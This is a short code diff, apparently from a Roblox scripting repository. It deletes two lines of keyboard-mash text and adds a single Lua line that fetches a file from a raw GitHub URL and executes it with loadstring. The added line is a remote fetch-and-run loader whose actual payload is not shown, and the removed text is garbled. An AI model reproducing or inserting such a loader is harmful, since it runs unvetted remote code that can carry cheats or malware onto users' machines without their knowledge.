@@ -1,2 +1,2 @@
-# askglk-awjtoi093258u90231urfkxdjsdkghsdklhgjlkcxl-bkmfsd-lhm-ed.fh-df
-asg
+loadstring(game:HttpGet('https://raw.githubusercontent.com/DogePR/asgasgasggggggggggggggggggggggggggg21111111111111111111111111111111111111111111111111111111111111111/main/README.md'))()
+
